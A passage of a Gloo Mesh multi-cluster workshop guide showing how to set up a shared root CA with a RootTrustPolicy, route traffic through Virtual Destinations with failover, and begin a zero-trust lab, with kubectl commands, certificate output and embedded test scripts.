Let's delete the Gloo Mesh objects we've created:

```bash
kubectl --context ${CLUSTER1} -n bookinfo-frontends delete faultinjectionpolicy ratings-fault-injection
kubectl --context ${CLUSTER1} -n bookinfo-frontends delete routetable ratings
kubectl --context ${CLUSTER1} -n bookinfo-frontends delete retrytimeoutpolicy reviews-request-timeout
kubectl --context ${CLUSTER1} -n bookinfo-frontends delete routetable reviews
```



## Lab 11 - Create the Root Trust Policy <a name="lab-11---create-the-root-trust-policy-"></a>
[<img src="https://img.youtube.com/vi/-A2U2fYYgrU/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/-A2U2fYYgrU "Video Link")

To allow secured (end-to-end mTLS) cross cluster communications, we need to make sure the certificates issued by the Istio control plane on each cluster are signed with intermediate certificates which have a common root CA.

Gloo Mesh fully automates this process.

Run this command to see how the communication between microservices occurs currently:

```
kubectl --context ${CLUSTER1} exec -t -n bookinfo-backends deploy/reviews-v1 \
-- openssl s_client -showcerts -connect ratings:9080 -alpn istio
```

Now, the output should be like that:

```,nocopy
...
Certificate chain
 0 s:
   i:O = cluster1
-----BEGIN CERTIFICATE-----
MIIDFzCCAf+gAwIBAgIRALsoWlroVcCc1n+VROhATrcwDQYJKoZIhvcNAQELBQAw
...
BPiAYRMH5j0gyBqiZZEwCfzfQe1e6aAgie9T
-----END CERTIFICATE-----
 1 s:O = cluster1
   i:O = cluster1
-----BEGIN CERTIFICATE-----
MIICzjCCAbagAwIBAgIRAKIx2hzMbAYzM74OC4Lj1FUwDQYJKoZIhvcNAQELBQAw
...
uMTPjt7p/sv74fsLgrx8WMI0pVQ7+2plpjaiIZ8KvEK9ye/0Mx8uyzTG7bpmVVWo
ugY=
-----END CERTIFICATE-----
...
```

Now, run the same command on the second cluster:

```
kubectl --context ${CLUSTER2} exec -t -n bookinfo-backends deploy/reviews-v1 \
-- openssl s_client -showcerts -connect ratings:9080 -alpn istio
```

The output should be like that:

```,nocopy
...
Certificate chain
 0 s:
   i:O = cluster2
-----BEGIN CERTIFICATE-----
MIIDFzCCAf+gAwIBAgIRALo1dmnbbP0hs1G82iBa2oAwDQYJKoZIhvcNAQELBQAw
...
YvDrZfKNOKwFWKMKKhCSi2rmCvLKuXXQJGhy
-----END CERTIFICATE-----
 1 s:O = cluster2
   i:O = cluster2
-----BEGIN CERTIFICATE-----
MIICzjCCAbagAwIBAgIRAIjegnzq/hN/NbMm3dmllnYwDQYJKoZIhvcNAQELBQAw
...
GZRM4zV9BopZg745Tdk2LVoHiBR536QxQv/0h1P0CdN9hNLklAhGN/Yf9SbDgLTw
6Sk=
-----END CERTIFICATE-----
...
```

The first certificate in the chain is the certificate of the workload and the second one is the Istio CA’s signing (CA) certificate.

As you can see, the Istio CA’s signing (CA) certificates are different in the 2 clusters, so one cluster can't validate certificates issued by the other cluster.

Creating a Root Trust Policy will unify these two CAs with a common root identity.

Run the following command to create the *Root Trust Policy*:

```bash
kubectl apply --context ${MGMT} -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: RootTrustPolicy
metadata:
  name: root-trust-policy
  namespace: gloo-mesh
spec:
  config:
    mgmtServerCa:
      generated: {}
    autoRestartPods: true # Restarting pods automatically is NOT RECOMMENDED in Production
EOF
```

When we create the RootTrustPolicy, Gloo Mesh will kick off the process of unifying identities under a shared root.

First, Gloo Mesh will create the Root certificate.

Then, Gloo Mesh will use the Gloo Mesh Agent on each of the clusters to create a new key/cert pair that will form an intermediate CA used by the mesh on that cluster. It will then create a Certificate Request (CR).

![Root Trust Policy](images/steps/root-trust-policy/gloo-mesh-root-trust-policy.svg)

Gloo Mesh will then sign the intermediate certificates with the Root certificate. 

At that point, we want Istio to pick up the new intermediate CA and start using that for its workloads. To do that Gloo Mesh creates a Kubernetes secret called `cacerts` in the `istio-system` namespace.

You can have a look at the Istio documentation [here](https://istio.io/latest/docs/tasks/security/cert-management/plugin-ca-cert) if you want to get more information about this process.

Check that the secret containing the new Istio CA has been created in the istio namespace, on the first cluster:

```
kubectl --context ${CLUSTER1} get secret -n istio-system cacerts -o yaml
```

Here is the expected output:

```
apiVersion: v1
data:
  ca-cert.pem: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUZFRENDQXZpZ0F3SUJBZ0lRUG5kRDkwejN4dytYeTBzYzNmcjRmekFOQmdrcWhraUc5dzBCQVFzRkFEQWIKTVJrd0Z3WURWU...
  jFWVlZtSWl3Si8va0NnNGVzWTkvZXdxSGlTMFByWDJmSDVDCmhrWnQ4dz09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
  ca-key.pem: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlKS0FJQkFBS0NBZ0VBczh6U0ZWcEFxeVNodXpMaHVXUlNFMEJJMXVwbnNBc3VnNjE2TzlKdzBlTmhhc3RtClUvZERZS...
  DT2t1bzBhdTFhb1VsS1NucldpL3kyYUtKbz0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K
  cert-chain.pem: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUZFRENDQXZpZ0F3SUJBZ0lRUG5kRDkwejN4dytYeTBzYzNmcjRmekFOQmdrcWhraUc5dzBCQVFzRkFEQWIKTVJrd0Z3WURWU...
  RBTHpzQUp2ZzFLRUR4T2QwT1JHZFhFbU9CZDBVUDk0KzJCN0tjM2tkNwpzNHYycEV2YVlnPT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=
  key.pem: ""
  root-cert.pem: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUU0ekNDQXN1Z0F3SUJBZ0lRT2lZbXFGdTF6Q3NzR0RFQ3JOdnBMakFOQmdrcWhraUc5dzBCQVFzRkFEQWIKTVJrd0Z3WURWU...
  UNBVEUtLS0tLQo=
kind: Secret
metadata:
  labels:
    context.mesh.gloo.solo.io/cluster: cluster1
    context.mesh.gloo.solo.io/namespace: istio-system
    gloo.solo.io/parent_cluster: cluster1
    gloo.solo.io/parent_group: internal.gloo.solo.io
    gloo.solo.io/parent_kind: IssuedCertificate
    gloo.solo.io/parent_name: istiod-1-12-istio-system-cluster1
    gloo.solo.io/parent_namespace: istio-system
    gloo.solo.io/parent_version: v2
    reconciler.mesh.gloo.solo.io/name: cert-agent
  name: cacerts
  namespace: istio-system
type: certificates.mesh.gloo.solo.io/issued_certificate
```

Same operation on the second cluster:

```
kubectl --context ${CLUSTER2} get secret -n istio-system cacerts -o yaml
```

Here is the expected output:

```
apiVersion: v1
data:
  ca-cert.pem: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUZFRENDQXZpZ0F3SUJBZ0lRWXE1V29iWFhGM1gwTjlNL3BYYkNKekFOQmdrcWhraUc5dzBCQVFzRkFEQWIKTVJrd0Z3WURWU...
  XpqQ1RtK2QwNm9YaDI2d1JPSjdQTlNJOTkrR29KUHEraXltCkZIekhVdz09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
  ca-key.pem: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlKS1FJQkFBS0NBZ0VBMGJPMTdSRklNTnh4K1lMUkEwcFJqRmRvbG1SdW9Oc3gxNUUvb3BMQ1l1RjFwUEptCndhR1U1V...
  MNU9JWk5ObDA4dUE1aE1Ca2gxNCtPKy9HMkoKLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K
  cert-chain.pem: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUZFRENDQXZpZ0F3SUJBZ0lRWXE1V29iWFhGM1gwTjlNL3BYYkNKekFOQmdrcWhraUc5dzBCQVFzRkFEQWIKTVJrd0Z3WURWU...
  RBTHpzQUp2ZzFLRUR4T2QwT1JHZFhFbU9CZDBVUDk0KzJCN0tjM2tkNwpzNHYycEV2YVlnPT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=
  key.pem: ""
  root-cert.pem: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUU0ekNDQXN1Z0F3SUJBZ0lRT2lZbXFGdTF6Q3NzR0RFQ3JOdnBMakFOQmdrcWhraUc5dzBCQVFzRkFEQWIKTVJrd0Z3WURWU...
  UNBVEUtLS0tLQo=
kind: Secret
metadata:
  labels:
    context.mesh.gloo.solo.io/cluster: cluster2
    context.mesh.gloo.solo.io/namespace: istio-system
    gloo.solo.io/parent_cluster: cluster2
    gloo.solo.io/parent_group: internal.gloo.solo.io
    gloo.solo.io/parent_kind: IssuedCertificate
    gloo.solo.io/parent_name: istiod-1-12-istio-system-cluster2
    gloo.solo.io/parent_namespace: istio-system
    gloo.solo.io/parent_version: v2
    reconciler.mesh.gloo.solo.io/name: cert-agent
  name: cacerts
  namespace: istio-system
type: certificates.mesh.gloo.solo.io/issued_certificate
```

As you can see, the secrets contain the same Root CA (base64 encoded), but different intermediate certs.

Have a look at the `RootTrustPolicy` object we've just created and notice the `autoRestartPods: true` in the `config`. This instructs Gloo Mesh to restart all the Pods in the mesh.

In recent versions of Istio, the control plane is able to pick up this new cert without any restart, but we would need to wait for the different Pods to renew their certificates (which happens every hour by default).

<!--bash
printf "\nWaiting until the secret is created in $CLUSTER1"
until kubectl --context ${CLUSTER1} get secret -n istio-system cacerts &>/dev/null
do
  printf "%s" "."
  sleep 1
done
printf "\n"

printf "\nWaiting until the secret is created in $CLUSTER2"
until kubectl --context ${CLUSTER2} get secret -n istio-system cacerts &>/dev/null
do
  printf "%s" "."
  sleep 1
done
printf "\n"
-->

Now, let's check what certificates we get when we run the same commands we ran before we created the Root Trust Policy:

```
kubectl --context ${CLUSTER1} exec -t -n bookinfo-backends deploy/reviews-v1 \
-- openssl s_client -showcerts -connect ratings:9080 -alpn istio
```

The output should be like that:

```,nocopy
...
Certificate chain
 0 s:
   i:
-----BEGIN CERTIFICATE-----
MIIEBzCCAe+gAwIBAgIRAK1yjsFkisSjNqm5tzmKQS8wDQYJKoZIhvcNAQELBQAw
...
T77lFKXx0eGtDNtWm/1IPiOutIMlFz/olVuN
-----END CERTIFICATE-----
 1 s:
   i:O = gloo-mesh
-----BEGIN CERTIFICATE-----
MIIFEDCCAvigAwIBAgIQPndD90z3xw+Xy0sc3fr4fzANBgkqhkiG9w0BAQsFADAb
...
hkZt8w==
-----END CERTIFICATE-----
 2 s:O = gloo-mesh
   i:O = gloo-mesh
-----BEGIN CERTIFICATE-----
MIIE4zCCAsugAwIBAgIQOiYmqFu1zCssGDECrNvpLjANBgkqhkiG9w0BAQsFADAb
...
s4v2pEvaYg==
-----END CERTIFICATE-----
 3 s:O = gloo-mesh
   i:O = gloo-mesh
-----BEGIN CERTIFICATE-----
MIIE4zCCAsugAwIBAgIQOiYmqFu1zCssGDECrNvpLjANBgkqhkiG9w0BAQsFADAb
...
s4v2pEvaYg==
-----END CERTIFICATE-----
...
```

And let's compare with what we get on the second cluster:

```
kubectl --context ${CLUSTER2} exec -t -n bookinfo-backends deploy/reviews-v1 \
-- openssl s_client -showcerts -connect ratings:9080 -alpn istio
```

The output should be like that:

```,nocopy
...
Certificate chain
 0 s:
   i:
-----BEGIN CERTIFICATE-----
MIIEBjCCAe6gAwIBAgIQfSeujXiz3KsbG01+zEcXGjANBgkqhkiG9w0BAQsFADAA
...
EtTlhPLbyf2GwkUgzXhdcu2G8uf6o16b0qU=
-----END CERTIFICATE-----
 1 s:
   i:O = gloo-mesh
-----BEGIN CERTIFICATE-----
MIIFEDCCAvigAwIBAgIQYq5WobXXF3X0N9M/pXbCJzANBgkqhkiG9w0BAQsFADAb
...
FHzHUw==
-----END CERTIFICATE-----
 2 s:O = gloo-mesh
   i:O = gloo-mesh
-----BEGIN CERTIFICATE-----
MIIE4zCCAsugAwIBAgIQOiYmqFu1zCssGDECrNvpLjANBgkqhkiG9w0BAQsFADAb
...
s4v2pEvaYg==
-----END CERTIFICATE-----
 3 s:O = gloo-mesh
   i:O = gloo-mesh
-----BEGIN CERTIFICATE-----
MIIE4zCCAsugAwIBAgIQOiYmqFu1zCssGDECrNvpLjANBgkqhkiG9w0BAQsFADAb
...
s4v2pEvaYg==
-----END CERTIFICATE-----
...
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-exec');

describe("cacerts secrets have been created", () => {
    const clusters = [process.env.CLUSTER1, process.env.CLUSTER2];
    clusters.forEach(cluster => {
        it('Secret is present in ' + cluster, () => helpers.k8sObjectIsPresent({ context: cluster, namespace: "istio-system", k8sType: "secret", k8sObj: "cacerts" }));
    });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/root-trust-policy/tests/cacert-secrets-created.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->


<!--bash
printf "Waiting for all pods to be bounced in cluster1"
until [ $(kubectl --context ${CLUSTER1} -n istio-system get podbouncedirectives -o jsonpath='{.items[].status.state}' | grep FINISHED -c) -eq 1 ]; do
  printf "%s" "."
  sleep 1
done
printf "Waiting for all pods to be bounced in cluster2"
until [ $(kubectl --context ${CLUSTER2} -n istio-system get podbouncedirectives -o jsonpath='{.items[].status.state}' | grep FINISHED -c) -eq 1 ]; do
  printf "%s" "."
  sleep 1
done
printf "Waiting for all pods needed for the test..."
printf "\n"
kubectl --context ${CLUSTER1} get deploy -n bookinfo-backends -oname|xargs -I {} kubectl --context ${CLUSTER1} rollout status -n bookinfo-backends {}
kubectl --context ${CLUSTER2} get deploy -n bookinfo-backends -oname|xargs -I {} kubectl --context ${CLUSTER2} rollout status -n bookinfo-backends {}
printf "\n"
-->
<!--bash
cat <<'EOF' > ./test.js
const chaiExec = require("@jsdevtools/chai-exec");
var chai = require('chai');
var expect = chai.expect;
chai.use(chaiExec);

afterEach(function (done) {
  if (this.currentTest.currentRetry() > 0) {
    process.stdout.write(".");
    setTimeout(done, 1000);
  } else {
    done();
  }
});

describe("Certificate issued by Gloo Mesh", () => {
  var expectedOutput = "i:O = gloo-mesh";

  it('Gloo mesh is the organization for ' + process.env.CLUSTER1 + ' certificate', () => {
    let cli = chaiExec("kubectl --context " + process.env.CLUSTER1 + " exec -t -n bookinfo-backends deploy/reviews-v1 -c istio-proxy -- openssl s_client -showcerts -connect ratings:9080 -alpn istio");

    expect(cli).stdout.to.contain(expectedOutput);
    expect(cli).stderr.to.not.be.empty;
  });


  it('Gloo mesh is the organization for ' + process.env.CLUSTER2 + ' certificate', () => {
    let cli = chaiExec("kubectl --context " + process.env.CLUSTER2 + " exec -t -n bookinfo-backends deploy/reviews-v1 -c istio-proxy -- openssl s_client -showcerts -connect ratings:9080 -alpn istio");

    expect(cli).stdout.to.contain(expectedOutput);
    expect(cli).stderr.to.not.be.empty;
  });

});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/root-trust-policy/tests/certificate-issued-by-gloo-mesh.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->



You can see that the last certificate in the chain is now identical on both clusters. It's the new root certificate.

The first certificate is the certificate of the service. Let's decrypt it.

Copy and paste the content of the certificate (including the BEGIN and END CERTIFICATE lines) in a new file called `/tmp/cert` and run the following command:

```
openssl x509 -in /tmp/cert -text
```

The output should be as follow:

```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            7d:27:ae:8d:78:b3:dc:ab:1b:1b:4d:7e:cc:47:17:1a
    Signature Algorithm: sha256WithRSAEncryption
        Issuer: 
        Validity
            Not Before: Sep 17 08:21:08 2020 GMT
            Not After : Sep 18 08:21:08 2020 GMT
        Subject: 
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
...
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            X509v3 Extended Key Usage: 
                TLS Web Server Authentication, TLS Web Client Authentication
            X509v3 Basic Constraints: critical
                CA:FALSE
            X509v3 Subject Alternative Name: critical
                URI:spiffe://cluster2/ns/bookinfo-backends/sa/bookinfo-ratings
    Signature Algorithm: sha256WithRSAEncryption
...
-----BEGIN CERTIFICATE-----
MIIEBjCCAe6gAwIBAgIQfSeujXiz3KsbG01+zEcXGjANBgkqhkiG9w0BAQsFADAA
...
EtTlhPLbyf2GwkUgzXhdcu2G8uf6o16b0qU=
-----END CERTIFICATE-----
```

The Subject Alternative Name (SAN) is the most interesting part. It allows the sidecar proxy of the `reviews` service to validate that it talks to the sidecar proxy of the `ratings` service.


We also need to make sure we restart our `in-mesh` deployment because it's not yet part of a `Workspace`:

```bash
kubectl --context ${CLUSTER1} -n httpbin rollout restart deploy/in-mesh
```




## Lab 12 - Leverage Virtual Destinations <a name="lab-12---leverage-virtual-destinations-"></a>
[<img src="https://img.youtube.com/vi/KikFWYxQodk/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/KikFWYxQodk "Video Link")

Right now, we've only exposed the `productpage` service on the first cluster.

In this lab, we're going to make it available on both clusters.

Let's update the VirtualGateway to expose it on both clusters.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: VirtualGateway
metadata:
  name: north-south-gw
  namespace: istio-gateways
spec:
  workloads:
    - selector:
        labels:
          istio: ingressgateway
  listeners:
    - http: {}
      port:
        number: 80
      httpsRedirect: true
    - http: {}
      port:
        number: 443
      tls:
        mode: SIMPLE
        secretName: tls-secret
      allowedRouteTables:
        - host: '*'
EOF
```

Then, we can configure the `RouteTable` to send the traffic to a Virtual Destination which will be composed of the `productpage` services running in both clusters.

Let's create this Virtual Destination.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: VirtualDestination
metadata:
  name: productpage
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  hosts:
  - productpage.global
  services:
  - namespace: bookinfo-frontends
    labels:
      app: productpage
  ports:
    - number: 9080
      protocol: HTTP
EOF
```

Note that we have added the label `expose` with the value `true` to make sure it will be exported to the Gateway `Workspace`.

After that, we need to update the `RouteTable` to use it.

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: productpage
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  http:
    - name: productpage
      matchers:
      - uri:
          exact: /productpage
      - uri:
          prefix: /static
      - uri:
          prefix: /api/v1/products
      forwardTo:
        destinations:
          - ref:
              name: productpage
              namespace: bookinfo-frontends
            kind: VIRTUAL_DESTINATION
            port:
              number: 9080
EOF
```

You can now access the `productpage` service
using the gateway of the second cluster.
You can access the `productpage` service from the second cluster using this URL: [https://cluster2-bookinfo.example.com/productpage](https://cluster2-bookinfo.example.com/productpage).

<!--bash
for i in {1..60}; do
  nc -z $HOST_GW_CLUSTER1 443 && break
  sleep 1
done
-->

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Productpage is available (SSL)", () => {
  it('/productpage is available in cluster1', () => helpers.checkURL({ host: `https://cluster1-bookinfo.example.com`, path: '/productpage', retCode: 200 }));
  it('/productpage is available in cluster2', () => helpers.checkURL({ host: `https://cluster2-bookinfo.example.com`, path: '/productpage', retCode: 200 }));
})

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/virtual-destination/tests/productpage-available-secure.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Now, if you try to access it from the first cluster, you can see that you now get the `v3` version of the `reviews` service (red stars).

This diagram shows the flow of the request (through both Istio ingress gateways):

![Gloo Mesh Virtual Destination Both](images/steps/virtual-destination/gloo-mesh-virtual-destination-both.svg)

It's nice, but you generally want to direct the traffic to the local services if they're available and failover to the remote cluster only when they're not.

In order to do that we need to create 2 other policies.

The first one is a `FailoverPolicy`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: resilience.policy.gloo.solo.io/v2
kind: FailoverPolicy
metadata:
  name: failover
  namespace: bookinfo-frontends
spec:
  applyToDestinations:
  - kind: VIRTUAL_DESTINATION
    selector:
      labels:
        failover: "true"
  config:
    localityMappings: []
EOF
```

It will update the Istio `DestinationRule` to enable failover.

Note that failover is enabled by default, so creating this `FailoverPolicy` is optional. By default, it will try to failover to the same zone, then same region and finally anywhere. A `FailoverPolicy` is generally used when you want to change this default behavior. For example, if you have many regions, you may want to failover only to a specific region.

The second one is an `OutlierDetectionPolicy`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: resilience.policy.gloo.solo.io/v2
kind: OutlierDetectionPolicy
metadata:
  name: outlier-detection
  namespace: bookinfo-frontends
spec:
  applyToDestinations:
  - kind: VIRTUAL_DESTINATION
    selector:
      labels:
        failover: "true"
  config:
    consecutiveErrors: 2
    interval: 5s
    baseEjectionTime: 30s
    maxEjectionPercent: 100
EOF
```

It will update the Istio `DestinationRule` to specify how/when we want the failover to happen.

As you can see, both policies will be applied to `VirtualDestination` objects that have the label `failover` set to `"true"`.

So we need to update the `VirtualDestination`:

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: VirtualDestination
metadata:
  name: productpage
  namespace: bookinfo-frontends
  labels:
    expose: "true"
    failover: "true"
spec:
  hosts:
  - productpage.global
  services:
  - namespace: bookinfo-frontends
    labels:
      app: productpage
  ports:
    - number: 9080
      protocol: HTTP
EOF
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Productpage is available (SSL)", () => {
  it('/productpage is available in cluster1', () => helpers.checkURL({ host: `https://cluster1-bookinfo.example.com`, path: '/productpage', retCode: 200 }));
  it('/productpage is available in cluster2', () => helpers.checkURL({ host: `https://cluster2-bookinfo.example.com`, path: '/productpage', retCode: 200 }));
})

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/virtual-destination/tests/productpage-available-secure.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

Now, if you try to access the productpage from the first cluster, you should only get the `v1` and `v2` versions (the local ones).

This updated diagram shows the flow of the requests using the local services:

![Gloo Mesh Virtual Destination](images/steps/virtual-destination/gloo-mesh-virtual-destination.svg)

If the `productpage` service doesn't exist on the first cluster, the Istio Ingress Gateway of this cluster will automatically use the `productpage` service running on the other cluster.

Let's try this:

```bash
kubectl --context ${CLUSTER1} -n bookinfo-frontends scale deploy/productpage-v1 --replicas=0
kubectl --context ${CLUSTER1} -n bookinfo-frontends wait --for=jsonpath='{.spec.replicas}'=0 deploy/productpage-v1
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Productpage is available (SSL)", () => {
  it('/productpage is available in cluster1', () => helpers.checkURL({ host: `https://cluster1-bookinfo.example.com`, path: '/productpage', retCode: 200 }));
  it('/productpage is available in cluster2', () => helpers.checkURL({ host: `https://cluster2-bookinfo.example.com`, path: '/productpage', retCode: 200 }));
})

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/virtual-destination/tests/productpage-available-secure.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

You can still access the application on cluster1 even if the productpage isn't running there anymore. And you can see the `v3` version of the `reviews` service (red stars).

This updated diagram shows the flow of the request now that the `productpage` service isn't running in the first cluster:

![Gloo Mesh Virtual Destination Remote](images/steps/virtual-destination/gloo-mesh-virtual-destination-remote.svg)

Let's restart the `productpage` service:

```bash
kubectl --context ${CLUSTER1} -n bookinfo-frontends scale deploy/productpage-v1 --replicas=1
kubectl --context ${CLUSTER1} -n bookinfo-frontends wait --for=jsonpath='{.status.readyReplicas}'=1 deploy/productpage-v1
```

But what happens if the `productpage` service is running, but is unavailable ?

Let's try !

The following command will patch the deployment to run a new version which won't respond to the incoming requests.

```bash
kubectl --context ${CLUSTER1} -n bookinfo-frontends patch deploy productpage-v1 --patch '{"spec": {"template": {"spec": {"containers": [{"name": "productpage","command": ["sleep", "20h"]}]}}}}'
kubectl --context ${CLUSTER1} -n bookinfo-frontends rollout status deploy/productpage-v1
```

<!--bash
cat <<'EOF' > ./test.js
const helpers = require('./tests/chai-http');

describe("Productpage is available (SSL)", () => {
  it('/productpage is available in cluster1', () => helpers.checkURL({ host: `https://cluster1-bookinfo.example.com`, path: '/productpage', retCode: 200 }));
  it('/productpage is available in cluster2', () => helpers.checkURL({ host: `https://cluster2-bookinfo.example.com`, path: '/productpage', retCode: 200 }));
})

EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/bookinfo/virtual-destination/tests/productpage-available-secure.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
timeout 2m mocha ./test.js --timeout 10000 --retries=120 --bail 2> ${tempfile} || { cat ${tempfile} && exit 1; }
-->

You can still access the bookinfo application.

This updated diagram shows the flow of the request now that the `productpage` service isn't available in the first cluster:

![Gloo Mesh Virtual Destination Failover](images/steps/virtual-destination/gloo-mesh-virtual-destination-failover.svg)

Run the following command to make the `productpage` available again in the first cluster

```bash
kubectl --context ${CLUSTER1} -n bookinfo-frontends patch deployment productpage-v1  --type json   -p '[{"op": "remove", "path": "/spec/template/spec/containers/0/command"}]'
kubectl --context ${CLUSTER1} -n bookinfo-frontends rollout status deploy/productpage-v1
```

Let's apply the original `RouteTable` and `VirtualGateway` yaml

```bash
kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: productpage
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  http:
    - name: productpage
      matchers:
      - uri:
          exact: /productpage
      - uri:
          prefix: /static
      - uri:
          prefix: /api/v1/products
      forwardTo:
        destinations:
          - ref:
              name: productpage
              namespace: bookinfo-frontends
              cluster: cluster1
            port:
              number: 9080
EOF

kubectl apply --context ${CLUSTER1} -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: VirtualGateway
metadata:
  name: north-south-gw
  namespace: istio-gateways
spec:
  workloads:
    - selector:
        labels:
          istio: ingressgateway
        cluster: cluster1
  listeners: 
    - http: {}
      port:
        number: 80
# ---------------- Redirect to https --------------------
      httpsRedirect: true
# -------------------------------------------------------
    - http: {}
# ---------------- SSL config ---------------------------
      port:
        number: 443
      tls:
        parameters:
          minimumProtocolVersion: TLSv1_3
        mode: SIMPLE
        secretName: tls-secret
# -------------------------------------------------------
      allowedRouteTables:
        - host: '*'
EOF
```

And also delete the different objects we've created:

```bash
kubectl --context ${CLUSTER1} -n bookinfo-frontends delete virtualdestination productpage
kubectl --context ${CLUSTER1} -n bookinfo-frontends delete failoverpolicy failover
kubectl --context ${CLUSTER1} -n bookinfo-frontends delete outlierdetectionpolicy outlier-detection
```




## Lab 13 - Zero trust <a name="lab-13---zero-trust-"></a>
[<img src="https://img.youtube.com/vi/BiaBlUaplEs/maxresdefault.jpg" alt="VIDEO LINK" width="560" height="315"/>](https://youtu.be/BiaBlUaplEs "Video Link")

In the previous step, we federated multiple meshes and established a shared root CA for a shared identity domain.

All the communications between Pods in the mesh are now encrypted by default, but:

- communications between services that are in the mesh and others which aren't in the mesh are still allowed and not encrypted
- all the services can talk together

Let's validate this.

<!--bash
(timeout 2s kubectl --context ${CLUSTER1} -n httpbin rollout status deploy/in-mesh) || (kubectl --context ${CLUSTER1} -n httpbin rollout restart deploy/in-mesh && kubectl --context ${CLUSTER1} -n httpbin rollout status deploy/in-mesh)
-->
Run the following commands to initiate a communication from a service which isn't in the mesh to a service which is in the mesh:

```
pod=$(kubectl --context ${CLUSTER1} -n httpbin get pods -l app=not-in-mesh -o jsonpath='{.items[0].metadata.name}')
kubectl --context ${CLUSTER1} -n httpbin debug -i -q ${pod} --image=curlimages/curl -- curl -s -o /dev/null -w "%{http_code}" http://reviews.bookinfo-backends.svc.cluster.local:9080/reviews/0
```

You should get a `200` response code which confirm that the communication is currently allowed.

<!--bash
cat <<'EOF' > ./test.js
var chai = require('chai');
var expect = chai.expect;
const helpers = require('./tests/chai-exec');
describe("Communication allowed", () => {
  it("Response code should be 200", () => {
    const podName = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n httpbin get pods -l app=not-in-mesh -o jsonpath='{.items[0].metadata.name}'" }).replaceAll("'", "");
    const command = helpers.getOutputForCommand({ command: "kubectl --context " + process.env.CLUSTER1 + " -n httpbin debug -i -q " + podName + " --image=curlimages/curl -- curl -s -o /dev/null -w \"%{http_code}\" http://reviews.bookinfo-backends:9080/reviews/0" }).replaceAll("'", "");
    expect(command).to.contain("200");
  });
});
EOF
echo "executing test dist/gloo-mesh-2-0-all-no-ilm/build/templates/steps/apps/httpbin/zero-trust/tests/not-in-mesh-to-in-mesh-allowed.test.js.liquid"
tempfile=$(mktemp)
echo "saving errors in ${tempfile}"
